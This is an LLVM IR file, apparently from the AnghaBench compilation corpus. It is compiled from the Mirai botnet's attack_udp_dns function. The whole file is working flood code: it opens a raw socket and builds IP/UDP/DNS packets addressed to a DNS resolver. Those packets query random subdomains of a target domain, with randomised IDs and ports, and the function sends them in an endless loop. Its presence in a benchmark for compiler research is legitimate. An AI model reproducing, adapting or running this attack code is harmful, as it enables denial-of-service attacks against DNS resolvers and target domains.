; ModuleID = '/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_attack_udp.c_attack_udp_dns.c'
source_filename = "/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_attack_udp.c_attack_udp_dns.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_target = type { %struct.TYPE_4__ }
%struct.TYPE_4__ = type { i32, %struct.TYPE_3__ }
%struct.TYPE_3__ = type { i8* }
%struct.attack_option = type { i32 }
%struct.iphdr = type { i32, i32, i32, i32, i32, i64, i8*, i32, i32, i8*, i8* }
%struct.udphdr = type { i32, i32, i8*, i64 }
%struct.dnshdr = type { i32, i8*, i8* }
%struct.dns_question = type { i8*, i8* }
%struct.sockaddr = type { i32 }

@ATK_OPT_IP_TOS = common dso_local global i32 0, align 4
@ATK_OPT_IP_IDENT = common dso_local global i32 0, align 4
@ATK_OPT_IP_TTL = common dso_local global i32 0, align 4
@ATK_OPT_IP_DF = common dso_local global i32 0, align 4
@FALSE = common dso_local global i32 0, align 4
@ATK_OPT_SPORT = common dso_local global i32 0, align 4
@ATK_OPT_DPORT = common dso_local global i32 0, align 4
@ATK_OPT_DNS_HDR_ID = common dso_local global i32 0, align 4
@ATK_OPT_PAYLOAD_SIZE = common dso_local global i32 0, align 4
@ATK_OPT_DOMAIN = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_UDP = common dso_local global i32 0, align 4
@IPPROTO_IP = common dso_local global i32 0, align 4
@IP_HDRINCL = common dso_local global i32 0, align 4
@LOCAL_ADDR = common dso_local global i32 0, align 4
@PROTO_DNS_QTYPE_A = common dso_local global i32 0, align 4
@PROTO_DNS_QCLASS_IP = common dso_local global i32 0, align 4
@TRUE = common dso_local global i64 0, align 8
@MSG_NOSIGNAL = common dso_local global i32 0, align 4
@errno = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @attack_udp_dns(i32 %0, %struct.attack_target* %1, i32 %2, %struct.attack_option* %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca %struct.iphdr*, align 8
  %27 = alloca %struct.udphdr*, align 8
  %28 = alloca %struct.dnshdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.dns_question*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.udphdr*, align 8
  %35 = alloca %struct.dnshdr*, align 8
  %36 = alloca i8*, align 8
  store i32 %0, i32* %5, align 4
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i32 %2, i32* %7, align 4
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %37 = load i32, i32* %5, align 4
  %38 = call i8* @calloc(i32 %37, i32 8)
  %39 = bitcast i8* %38 to i8**
  store i8** %39, i8*** %11, align 8
  %40 = load i32, i32* %7, align 4
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = load i32, i32* @ATK_OPT_IP_TOS, align 4
  %43 = call i8* @attack_get_opt_int(i32 %40, %struct.attack_option* %41, i32 %42, i32 0)
  %44 = ptrtoint i8* %43 to i32
  store i32 %44, i32* %12, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = load i32, i32* @ATK_OPT_IP_IDENT, align 4
  %48 = call i8* @attack_get_opt_int(i32 %45, %struct.attack_option* %46, i32 %47, i32 65535)
  %49 = ptrtoint i8* %48 to i32
  store i32 %49, i32* %13, align 4
  %50 = load i32, i32* %7, align 4
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = load i32, i32* @ATK_OPT_IP_TTL, align 4
  %53 = call i8* @attack_get_opt_int(i32 %50, %struct.attack_option* %51, i32 %52, i32 64)
  %54 = ptrtoint i8* %53 to i32
  store i32 %54, i32* %14, align 4
  %55 = load i32, i32* %7, align 4
  %56 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %57 = load i32, i32* @ATK_OPT_IP_DF, align 4
  %58 = load i32, i32* @FALSE, align 4
  %59 = call i8* @attack_get_opt_int(i32 %55, %struct.attack_option* %56, i32 %57, i32 %58)
  store i8* %59, i8** %15, align 8
  %60 = load i32, i32* %7, align 4
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = load i32, i32* @ATK_OPT_SPORT, align 4
  %63 = call i8* @attack_get_opt_int(i32 %60, %struct.attack_option* %61, i32 %62, i32 65535)
  %64 = ptrtoint i8* %63 to i32
  store i32 %64, i32* %16, align 4
  %65 = load i32, i32* %7, align 4
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = load i32, i32* @ATK_OPT_DPORT, align 4
  %68 = call i8* @attack_get_opt_int(i32 %65, %struct.attack_option* %66, i32 %67, i32 53)
  %69 = ptrtoint i8* %68 to i32
  store i32 %69, i32* %17, align 4
  %70 = load i32, i32* %7, align 4
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = load i32, i32* @ATK_OPT_DNS_HDR_ID, align 4
  %73 = call i8* @attack_get_opt_int(i32 %70, %struct.attack_option* %71, i32 %72, i32 65535)
  %74 = ptrtoint i8* %73 to i32
  store i32 %74, i32* %18, align 4
  %75 = load i32, i32* %7, align 4
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = load i32, i32* @ATK_OPT_PAYLOAD_SIZE, align 4
  %78 = call i8* @attack_get_opt_int(i32 %75, %struct.attack_option* %76, i32 %77, i32 12)
  %79 = ptrtoint i8* %78 to i32
  store i32 %79, i32* %19, align 4
  %80 = load i32, i32* %7, align 4
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = load i32, i32* @ATK_OPT_DOMAIN, align 4
  %83 = call i8* @attack_get_opt_str(i32 %80, %struct.attack_option* %81, i32 %82, i32* null)
  store i8* %83, i8** %20, align 8
  %84 = call i8* (...) @get_dns_resolver()
  store i8* %84, i8** %22, align 8
  %85 = load i8*, i8** %20, align 8
  %86 = icmp eq i8* %85, null
  br i1 %86, label %87, label %88

87:                                               ; preds = %4
  br label %403

88:                                               ; preds = %4
  %89 = load i8*, i8** %20, align 8
  %90 = call i32 @util_strlen(i8* %89)
  store i32 %90, i32* %21, align 4
  %91 = load i32, i32* @AF_INET, align 4
  %92 = load i32, i32* @SOCK_RAW, align 4
  %93 = load i32, i32* @IPPROTO_UDP, align 4
  %94 = call i32 @socket(i32 %91, i32 %92, i32 %93)
  store i32 %94, i32* %10, align 4
  %95 = icmp eq i32 %94, -1
  br i1 %95, label %96, label %97

96:                                               ; preds = %88
  br label %403

97:                                               ; preds = %88
  store i32 1, i32* %9, align 4
  %98 = load i32, i32* %10, align 4
  %99 = load i32, i32* @IPPROTO_IP, align 4
  %100 = load i32, i32* @IP_HDRINCL, align 4
  %101 = call i32 @setsockopt(i32 %98, i32 %99, i32 %100, i32* %9, i32 4)
  %102 = icmp eq i32 %101, -1
  br i1 %102, label %103, label %106

103:                                              ; preds = %97
  %104 = load i32, i32* %10, align 4
  %105 = call i32 @close(i32 %104)
  br label %403

106:                                              ; preds = %97
  store i32 0, i32* %9, align 4
  br label %107

107:                                              ; preds = %271, %106
  %108 = load i32, i32* %9, align 4
  %109 = load i32, i32* %5, align 4
  %110 = icmp slt i32 %108, %109
  br i1 %110, label %111, label %274

111:                                              ; preds = %107
  store i32 0, i32* %24, align 4
  store i32 0, i32* %25, align 4
  %112 = call i8* @calloc(i32 600, i32 1)
  %113 = load i8**, i8*** %11, align 8
  %114 = load i32, i32* %9, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds i8*, i8** %113, i64 %115
  store i8* %112, i8** %116, align 8
  %117 = load i8**, i8*** %11, align 8
  %118 = load i32, i32* %9, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds i8*, i8** %117, i64 %119
  %121 = load i8*, i8** %120, align 8
  %122 = bitcast i8* %121 to %struct.iphdr*
  store %struct.iphdr* %122, %struct.iphdr** %26, align 8
  %123 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %124 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %123, i64 1
  %125 = bitcast %struct.iphdr* %124 to %struct.udphdr*
  store %struct.udphdr* %125, %struct.udphdr** %27, align 8
  %126 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %127 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %126, i64 1
  %128 = bitcast %struct.udphdr* %127 to %struct.dnshdr*
  store %struct.dnshdr* %128, %struct.dnshdr** %28, align 8
  %129 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %130 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %129, i64 1
  %131 = bitcast %struct.dnshdr* %130 to i8*
  store i8* %131, i8** %29, align 8
  %132 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %133 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %132, i32 0, i32 0
  store i32 4, i32* %133, align 8
  %134 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %135 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %134, i32 0, i32 1
  store i32 5, i32* %135, align 4
  %136 = load i32, i32* %12, align 4
  %137 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %138 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %137, i32 0, i32 2
  store i32 %136, i32* %138, align 8
  %139 = load i32, i32* %19, align 4
  %140 = sext i32 %139 to i64
  %141 = add i64 113, %140
  %142 = add i64 %141, 2
  %143 = load i32, i32* %21, align 4
  %144 = sext i32 %143 to i64
  %145 = add i64 %142, %144
  %146 = add i64 %145, 16
  %147 = trunc i64 %146 to i32
  %148 = call i8* @htons(i32 %147)
  %149 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i32 0, i32 10
  store i8* %148, i8** %150, align 8
  %151 = load i32, i32* %13, align 4
  %152 = call i8* @htons(i32 %151)
  %153 = ptrtoint i8* %152 to i32
  %154 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %155 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %154, i32 0, i32 3
  store i32 %153, i32* %155, align 4
  %156 = load i32, i32* %14, align 4
  %157 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %158 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %157, i32 0, i32 4
  store i32 %156, i32* %158, align 8
  %159 = load i8*, i8** %15, align 8
  %160 = icmp ne i8* %159, null
  br i1 %160, label %161, label %165

161:                                              ; preds = %111
  %162 = call i8* @htons(i32 16384)
  %163 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 9
  store i8* %162, i8** %164, align 8
  br label %165

165:                                              ; preds = %161, %111
  %166 = load i32, i32* @IPPROTO_UDP, align 4
  %167 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i32 0, i32 8
  store i32 %166, i32* %168, align 4
  %169 = load i32, i32* @LOCAL_ADDR, align 4
  %170 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 7
  store i32 %169, i32* %171, align 8
  %172 = load i8*, i8** %22, align 8
  %173 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 6
  store i8* %172, i8** %174, align 8
  %175 = load i32, i32* %16, align 4
  %176 = call i8* @htons(i32 %175)
  %177 = ptrtoint i8* %176 to i32
  %178 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %179 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %178, i32 0, i32 0
  store i32 %177, i32* %179, align 8
  %180 = load i32, i32* %17, align 4
  %181 = call i8* @htons(i32 %180)
  %182 = ptrtoint i8* %181 to i32
  %183 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %184 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %183, i32 0, i32 1
  store i32 %182, i32* %184, align 4
  %185 = load i32, i32* %19, align 4
  %186 = sext i32 %185 to i64
  %187 = add i64 49, %186
  %188 = add i64 %187, 2
  %189 = load i32, i32* %21, align 4
  %190 = sext i32 %189 to i64
  %191 = add i64 %188, %190
  %192 = add i64 %191, 16
  %193 = trunc i64 %192 to i32
  %194 = call i8* @htons(i32 %193)
  %195 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %196 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %195, i32 0, i32 2
  store i8* %194, i8** %196, align 8
  %197 = load i32, i32* %18, align 4
  %198 = call i8* @htons(i32 %197)
  %199 = ptrtoint i8* %198 to i32
  %200 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %201 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %200, i32 0, i32 0
  store i32 %199, i32* %201, align 8
  %202 = call i8* @htons(i32 256)
  %203 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %204 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %203, i32 0, i32 2
  store i8* %202, i8** %204, align 8
  %205 = call i8* @htons(i32 1)
  %206 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %207 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %206, i32 0, i32 1
  store i8* %205, i8** %207, align 8
  %208 = load i32, i32* %19, align 4
  %209 = trunc i32 %208 to i8
  %210 = load i8*, i8** %29, align 8
  %211 = getelementptr inbounds i8, i8* %210, i32 1
  store i8* %211, i8** %29, align 8
  store i8 %209, i8* %210, align 1
  %212 = load i32, i32* %19, align 4
  %213 = load i8*, i8** %29, align 8
  %214 = sext i32 %212 to i64
  %215 = getelementptr inbounds i8, i8* %213, i64 %214
  store i8* %215, i8** %29, align 8
  %216 = load i8*, i8** %29, align 8
  store i8* %216, i8** %30, align 8
  %217 = load i8*, i8** %29, align 8
  %218 = getelementptr inbounds i8, i8* %217, i64 1
  %219 = load i8*, i8** %20, align 8
  %220 = load i32, i32* %21, align 4
  %221 = add nsw i32 %220, 1
  %222 = call i32 @util_memcpy(i8* %218, i8* %219, i32 %221)
  store i32 0, i32* %23, align 4
  br label %223

223:                                              ; preds = %250, %165
  %224 = load i32, i32* %23, align 4
  %225 = load i32, i32* %21, align 4
  %226 = icmp slt i32 %224, %225
  br i1 %226, label %227, label %253

227:                                              ; preds = %223
  %228 = load i8*, i8** %20, align 8
  %229 = load i32, i32* %23, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds i8, i8* %228, i64 %230
  %232 = load i8, i8* %231, align 1
  %233 = sext i8 %232 to i32
  %234 = icmp eq i32 %233, 46
  br i1 %234, label %235, label %246

235:                                              ; preds = %227
  %236 = load i32, i32* %24, align 4
  %237 = trunc i32 %236 to i8
  %238 = load i8*, i8** %30, align 8
  store i8 %237, i8* %238, align 1
  store i32 0, i32* %24, align 4
  %239 = load i32, i32* %25, align 4
  %240 = add nsw i32 %239, 1
  store i32 %240, i32* %25, align 4
  %241 = load i8*, i8** %29, align 8
  %242 = load i32, i32* %23, align 4
  %243 = sext i32 %242 to i64
  %244 = getelementptr inbounds i8, i8* %241, i64 %243
  %245 = getelementptr inbounds i8, i8* %244, i64 1
  store i8* %245, i8** %30, align 8
  br label %249

246:                                              ; preds = %227
  %247 = load i32, i32* %24, align 4
  %248 = add nsw i32 %247, 1
  store i32 %248, i32* %24, align 4
  br label %249

249:                                              ; preds = %246, %235
  br label %250

250:                                              ; preds = %249
  %251 = load i32, i32* %23, align 4
  %252 = add nsw i32 %251, 1
  store i32 %252, i32* %23, align 4
  br label %223

253:                                              ; preds = %223
  %254 = load i32, i32* %24, align 4
  %255 = trunc i32 %254 to i8
  %256 = load i8*, i8** %30, align 8
  store i8 %255, i8* %256, align 1
  %257 = load i8*, i8** %29, align 8
  %258 = load i32, i32* %21, align 4
  %259 = sext i32 %258 to i64
  %260 = getelementptr inbounds i8, i8* %257, i64 %259
  %261 = getelementptr inbounds i8, i8* %260, i64 2
  %262 = bitcast i8* %261 to %struct.dns_question*
  store %struct.dns_question* %262, %struct.dns_question** %31, align 8
  %263 = load i32, i32* @PROTO_DNS_QTYPE_A, align 4
  %264 = call i8* @htons(i32 %263)
  %265 = load %struct.dns_question*, %struct.dns_question** %31, align 8
  %266 = getelementptr inbounds %struct.dns_question, %struct.dns_question* %265, i32 0, i32 1
  store i8* %264, i8** %266, align 8
  %267 = load i32, i32* @PROTO_DNS_QCLASS_IP, align 4
  %268 = call i8* @htons(i32 %267)
  %269 = load %struct.dns_question*, %struct.dns_question** %31, align 8
  %270 = getelementptr inbounds %struct.dns_question, %struct.dns_question* %269, i32 0, i32 0
  store i8* %268, i8** %270, align 8
  br label %271

271:                                              ; preds = %253
  %272 = load i32, i32* %9, align 4
  %273 = add nsw i32 %272, 1
  store i32 %273, i32* %9, align 4
  br label %107

274:                                              ; preds = %107
  br label %275

275:                                              ; preds = %402, %274
  %276 = load i64, i64* @TRUE, align 8
  %277 = icmp ne i64 %276, 0
  br i1 %277, label %278, label %403

278:                                              ; preds = %275
  store i32 0, i32* %9, align 4
  br label %279

279:                                              ; preds = %399, %278
  %280 = load i32, i32* %9, align 4
  %281 = load i32, i32* %5, align 4
  %282 = icmp slt i32 %280, %281
  br i1 %282, label %283, label %402

283:                                              ; preds = %279
  %284 = load i8**, i8*** %11, align 8
  %285 = load i32, i32* %9, align 4
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds i8*, i8** %284, i64 %286
  %288 = load i8*, i8** %287, align 8
  store i8* %288, i8** %32, align 8
  %289 = load i8*, i8** %32, align 8
  %290 = bitcast i8* %289 to %struct.iphdr*
  store %struct.iphdr* %290, %struct.iphdr** %33, align 8
  %291 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %292 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %291, i64 1
  %293 = bitcast %struct.iphdr* %292 to %struct.udphdr*
  store %struct.udphdr* %293, %struct.udphdr** %34, align 8
  %294 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %295 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %294, i64 1
  %296 = bitcast %struct.udphdr* %295 to %struct.dnshdr*
  store %struct.dnshdr* %296, %struct.dnshdr** %35, align 8
  %297 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %298 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %297, i64 1
  %299 = bitcast %struct.dnshdr* %298 to i8*
  %300 = getelementptr inbounds i8, i8* %299, i64 1
  store i8* %300, i8** %36, align 8
  %301 = load i32, i32* %13, align 4
  %302 = icmp eq i32 %301, 65535
  br i1 %302, label %303, label %308

303:                                              ; preds = %283
  %304 = call i32 (...) @rand_next()
  %305 = and i32 %304, 65535
  %306 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %307 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %306, i32 0, i32 3
  store i32 %305, i32* %307, align 4
  br label %308

308:                                              ; preds = %303, %283
  %309 = load i32, i32* %16, align 4
  %310 = icmp eq i32 %309, 65535
  br i1 %310, label %311, label %316

311:                                              ; preds = %308
  %312 = call i32 (...) @rand_next()
  %313 = and i32 %312, 65535
  %314 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %315 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %314, i32 0, i32 0
  store i32 %313, i32* %315, align 8
  br label %316

316:                                              ; preds = %311, %308
  %317 = load i32, i32* %17, align 4
  %318 = icmp eq i32 %317, 65535
  br i1 %318, label %319, label %324

319:                                              ; preds = %316
  %320 = call i32 (...) @rand_next()
  %321 = and i32 %320, 65535
  %322 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %323 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %322, i32 0, i32 1
  store i32 %321, i32* %323, align 4
  br label %324

324:                                              ; preds = %319, %316
  %325 = load i32, i32* %18, align 4
  %326 = icmp eq i32 %325, 65535
  br i1 %326, label %327, label %332

327:                                              ; preds = %324
  %328 = call i32 (...) @rand_next()
  %329 = and i32 %328, 65535
  %330 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %331 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %330, i32 0, i32 0
  store i32 %329, i32* %331, align 8
  br label %332

332:                                              ; preds = %327, %324
  %333 = load i8*, i8** %36, align 8
  %334 = bitcast i8* %333 to i32*
  %335 = load i32, i32* %19, align 4
  %336 = call i32 @rand_alphastr(i32* %334, i32 %335)
  %337 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %338 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %337, i32 0, i32 5
  store i64 0, i64* %338, align 8
  %339 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %340 = bitcast %struct.iphdr* %339 to i32*
  %341 = call i64 @checksum_generic(i32* %340, i32 64)
  %342 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %343 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %342, i32 0, i32 5
  store i64 %341, i64* %343, align 8
  %344 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %345 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %344, i32 0, i32 3
  store i64 0, i64* %345, align 8
  %346 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %347 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %348 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %349 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %348, i32 0, i32 2
  %350 = load i8*, i8** %349, align 8
  %351 = load i32, i32* %19, align 4
  %352 = sext i32 %351 to i64
  %353 = add i64 49, %352
  %354 = add i64 %353, 2
  %355 = load i32, i32* %21, align 4
  %356 = sext i32 %355 to i64
  %357 = add i64 %354, %356
  %358 = add i64 %357, 16
  %359 = trunc i64 %358 to i32
  %360 = call i64 @checksum_tcpudp(%struct.iphdr* %346, %struct.udphdr* %347, i8* %350, i32 %359)
  %361 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %362 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %361, i32 0, i32 3
  store i64 %360, i64* %362, align 8
  %363 = load i8*, i8** %22, align 8
  %364 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %365 = load i32, i32* %9, align 4
  %366 = sext i32 %365 to i64
  %367 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %364, i64 %366
  %368 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %367, i32 0, i32 0
  %369 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %368, i32 0, i32 1
  %370 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %369, i32 0, i32 0
  store i8* %363, i8** %370, align 8
  %371 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %372 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %371, i32 0, i32 1
  %373 = load i32, i32* %372, align 4
  %374 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %375 = load i32, i32* %9, align 4
  %376 = sext i32 %375 to i64
  %377 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %374, i64 %376
  %378 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %377, i32 0, i32 0
  %379 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %378, i32 0, i32 0
  store i32 %373, i32* %379, align 8
  %380 = load i32, i32* %10, align 4
  %381 = load i8*, i8** %32, align 8
  %382 = load i32, i32* %19, align 4
  %383 = sext i32 %382 to i64
  %384 = add i64 113, %383
  %385 = add i64 %384, 2
  %386 = load i32, i32* %21, align 4
  %387 = sext i32 %386 to i64
  %388 = add i64 %385, %387
  %389 = add i64 %388, 16
  %390 = trunc i64 %389 to i32
  %391 = load i32, i32* @MSG_NOSIGNAL, align 4
  %392 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %393 = load i32, i32* %9, align 4
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %392, i64 %394
  %396 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %395, i32 0, i32 0
  %397 = bitcast %struct.TYPE_4__* %396 to %struct.sockaddr*
  %398 = call i32 @sendto(i32 %380, i8* %381, i32 %390, i32 %391, %struct.sockaddr* %397, i32 4)
  br label %399

399:                                              ; preds = %332
  %400 = load i32, i32* %9, align 4
  %401 = add nsw i32 %400, 1
  store i32 %401, i32* %9, align 4
  br label %279

402:                                              ; preds = %279
  br label %275

403:                                              ; preds = %87, %96, %103, %275
  ret void
}

declare dso_local i8* @calloc(i32, i32) #1

declare dso_local i8* @attack_get_opt_int(i32, %struct.attack_option*, i32, i32) #1

declare dso_local i8* @attack_get_opt_str(i32, %struct.attack_option*, i32, i32*) #1

declare dso_local i8* @get_dns_resolver(...) #1

declare dso_local i32 @util_strlen(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @setsockopt(i32, i32, i32, i32*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i32 @util_memcpy(i8*, i8*, i32) #1

declare dso_local i32 @rand_next(...) #1

declare dso_local i32 @rand_alphastr(i32*, i32) #1

declare dso_local i64 @checksum_generic(i32*, i32) #1

declare dso_local i64 @checksum_tcpudp(%struct.iphdr*, %struct.udphdr*, i8*, i32) #1

declare dso_local i32 @sendto(i32, i8*, i32, i32, %struct.sockaddr*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
